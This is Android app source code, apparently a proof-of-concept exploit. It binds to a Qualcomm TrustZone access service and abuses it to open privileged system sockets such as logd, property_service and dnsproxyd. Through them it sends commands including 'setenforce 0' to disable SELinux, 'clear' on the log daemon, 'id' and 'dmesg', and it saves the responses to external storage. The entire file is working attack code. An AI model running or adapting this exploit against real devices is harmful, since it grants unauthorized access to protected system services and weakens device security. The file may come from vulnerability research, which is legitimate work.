package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd mRemoteService;
    private boolean isBound = false;
    private boolean isTesting = false;
    private List<String> successfulSockets = new ArrayList<>();

    private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mRemoteService = IMinkSocketFd.Stub.asInterface(service);
            appendLog("Service bound");
            updateStatus("Bound - starting tests");
            enableButtons(false, true);
            new Thread(() -> executeFullTest()).start();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            appendLog("Service disconnected");
            mRemoteService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);
        btnStart.setOnClickListener(v -> {
            if (!isBound && !isTesting) bindService();
        });
        btnStop.setOnClickListener(v -> {
            if (isBound) {
                unbindService(serviceConnection);
                isBound = false;
                mRemoteService = null;
                enableButtons(true, false);
                updateStatus("Stopped by user");
                appendLog("--- Test stopped ---");
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        isTesting = true;
        appendLog("========== Socket Discovery Phase ==========");

        String[] targetSockets = {
            "mdnsd", "tcm", "fwmarkd", "dnsproxyd", "logd", "property_service"
        };

        int[] arrSizes = {1, 5};

        for (String name : targetSockets) {
            String path = "/dev/socket/" + name;
            boolean success = false;
            for (int size : arrSizes) {
                int[] iArr = new int[size];
                if (tryConnect(path, iArr)) {
                    success = true;
                    successfulSockets.add(path);
                    appendLog("SUCCESS: " + path);
                    break;
                }
                try { Thread.sleep(100); } catch (InterruptedException ignored) {}
            }
            if (!success) appendLog("FAIL: " + path);
        }

        appendLog("========== Deep Interaction Phase ==========");
        for (String path : successfulSockets) {
            interactWithSocket(path);
        }

        appendLog("========== All tests completed ==========");
        updateStatus("Done");
        enableButtons(true, false);
        isTesting = false;
        saveLog();
    }

    private boolean tryConnect(String path, int[] iArr) {
        if (mRemoteService == null) return false;
        try {
            ParcelFileDescriptor pfd = mRemoteService.a(path, iArr);
            if (pfd != null) {
                pfd.close();
                return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    private void interactWithSocket(String path) {
        appendLog("--- Interacting with " + path + " ---");
        ParcelFileDescriptor pfd = null;
        try {
            int[] iArr = new int[1];
            pfd = mRemoteService.a(path, iArr);
            if (pfd == null) {
                appendLog("  Re-connect failed");
                return;
            }
            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
            if (fdesc == null || !fdesc.valid()) {
                appendLog("  FD invalid");
                return;
            }

            OutputStream os = new FileOutputStream(fdesc);
            InputStream is = new FileInputStream(fdesc);

            List<byte[]> commands = new ArrayList<>();

            if (path.contains("logd")) {
                commands.add("getLog\n".getBytes(StandardCharsets.UTF_8));
                commands.add("clear\n".getBytes(StandardCharsets.UTF_8));
                commands.add("help\n".getBytes(StandardCharsets.UTF_8));
                commands.add("status\n".getBytes(StandardCharsets.UTF_8));
                commands.add("version\n".getBytes(StandardCharsets.UTF_8));
                commands.add("dump\n".getBytes(StandardCharsets.UTF_8));
                commands.add("logcat -d\n".getBytes(StandardCharsets.UTF_8));
            } else if (path.contains("property_service")) {
                commands.add("getprop\n".getBytes(StandardCharsets.UTF_8));
                commands.add("list\n".getBytes(StandardCharsets.UTF_8));
                commands.add("help\n".getBytes(StandardCharsets.UTF_8));
                commands.add("status\n".getBytes(StandardCharsets.UTF_8));
                commands.add("version\n".getBytes(StandardCharsets.UTF_8));
                commands.add("dump\n".getBytes(StandardCharsets.UTF_8));
                commands.add("getprop ro.build.version.sdk\n".getBytes(StandardCharsets.UTF_8));
                commands.add("getprop ro.build.version.release\n".getBytes(StandardCharsets.UTF_8));
                commands.add("getprop ro.product.model\n".getBytes(StandardCharsets.UTF_8));
                commands.add("getprop ro.product.brand\n".getBytes(StandardCharsets.UTF_8));
                commands.add("getprop ro.product.device\n".getBytes(StandardCharsets.UTF_8));
            } else {
                commands.add("help\n".getBytes(StandardCharsets.UTF_8));
                commands.add("status\n".getBytes(StandardCharsets.UTF_8));
                commands.add("version\n".getBytes(StandardCharsets.UTF_8));
                commands.add("getprop\n".getBytes(StandardCharsets.UTF_8));
                commands.add("list\n".getBytes(StandardCharsets.UTF_8));
                commands.add("dump\n".getBytes(StandardCharsets.UTF_8));
                commands.add("logcat -d\n".getBytes(StandardCharsets.UTF_8));
                commands.add("id\n".getBytes(StandardCharsets.UTF_8));
                commands.add("setenforce 0\n".getBytes(StandardCharsets.UTF_8));
                commands.add("dmesg\n".getBytes(StandardCharsets.UTF_8));
                commands.add("exit\n".getBytes(StandardCharsets.UTF_8));
            }

            for (byte[] cmd : commands) {
                String cmdStr = new String(cmd, StandardCharsets.UTF_8).replace("\n", "\\n");
                appendLog("  Sending: " + cmdStr);
                try {
                    os.write(cmd);
                    os.flush();
                    byte[] buffer = new byte[8192];
                    int len = is.read(buffer, 0, buffer.length);
                    if (len > 0) {
                        String response = new String(buffer, 0, len, StandardCharsets.UTF_8);
                        appendLog("  Response: " + response);
                    } else {
                        appendLog("  No response (len=" + len + ")");
                    }
                } catch (Exception e) {
                    appendLog("  Command failed: " + e.getMessage());
                }
                try { Thread.sleep(200); } catch (InterruptedException ignored) {}
            }

            pfd.close();
        } catch (Exception e) {
            appendLog("  Interaction exception: " + e.toString());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "deep_socket_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== TZAccess Deep Socket PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (isBound) {
            try { unbindService(serviceConnection); } catch (Exception ignored) {}
        }
        saveLog();
    }
}
